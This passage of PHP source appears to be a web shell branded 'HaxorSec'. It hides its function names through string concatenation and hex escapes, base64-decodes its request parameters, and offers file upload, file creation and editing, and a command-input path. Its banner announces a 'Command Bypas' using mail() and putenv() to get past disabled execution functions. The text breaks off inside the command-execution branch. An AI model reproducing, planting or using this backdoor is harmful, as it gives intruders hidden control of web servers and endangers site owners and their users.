$mek = "m"."k"."d"."i"."r";
$fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$drnmm = "d"."i"."r"."n"."a"."m"."e";
$unl = "u"."n"."l"."i"."n"."k";
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = $ril($_SERVER['\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54']);
$scriptDirectory = $drnmm(__FILE__);

function x($b) {

    $be = "ba"."se"."64"."_"."en"."co"."de";
    return $be($b);
}

function y($b) {
    $bd = "ba"."se"."64"."_"."de"."co"."de";
    return $bd($b);
}
echo "<font color='black'>[ Command Bypas Status Wajib ON MAIL PUTENV @ HaxorSec]</font><br>";
if (function_exists('mail')) {
    echo "<font color='black'>[ Function mail() ] :</font><font color='green'> [ ON ]</font><br>";
} else {
    echo "<font color='black'>[ Function mail() ] :<font color='red'> [ OFF ]</font><br>";
}
if (function_exists('putenv')) {
    echo "<font color='black'>[ Function putenv() ] :</font><font color='green'> [ ON ]</font><br>";
} else {
    echo "<font color='black'>[ Function putenv() ] :<font color='red'> [ OFF ]</font><br>";
}
foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = $ril(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
$chd($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        $target_file = $currentDirectory . '/' . $bs($_FILES["fileToUpload"]["name"]);
        if ($mup($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<hr>File " . $htm($bs($_FILES["fileToUpload"]["name"])) . " Upload success<hr>";
        } else {
            echo "<hr>Sorry, there was an error uploading your file.<hr>";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $ff = $_POST['folder_name'];
        $newFolder = $currentDirectory . '/' . $ff;
        if (!file_exists($newfolder)) {
            if ($mek($newFolder) !== false) {
                echo '<hr>Folder created successfully!';
            }else{
                echo '<hr>Error: Failed to create folder!';
            }
        }

    } elseif (isset($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if ($fpc($newFile, '') !== false) {
                echo '<hr>File created successfully!' . $fileName .' ';
                $fileToView = $newFile;
                if (file_exists($fileToView)) {
                    $fileContent = $fgc($fileToView);
                    $viewCommandResult = '<hr><p>Result: ' . $fileName . '</p>
                    <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
                    <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
                    <input type="hidden" name="edit_file" value="' . $fileName . '">
                    <input type="submit" value=" Save "></form></td>';
                } else {
                    $viewCommandResult = '<hr><p>Error: File not found!</p>';
                }
            } else {
                echo '<hr>Error: Failed to create file!';
            }
        }else{
            echo '<hr>Error: File Already Exists!';
        }
    } elseif (isset($_POST['cmd_input'])){
        $p = "p"."u"."t"."e"."n"."v";
        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
        $m = "m"."a"."i"."l";
        $base = "ba"."se"."64"."_"."de"."co"."de";
        $en = "ba"."se"."64"."_"."en"."co"."de";
        $drnm = "d"."i"."r"."n"."a"."m"."e";
        $currentFilePath = $_SERVER['PHP_SELF'];
        $doc = $_SERVER['DOCUMENT_ROOT'];
        $directoryPath = $drnm($currentFilePath);
        $full = $doc . $directoryPath;
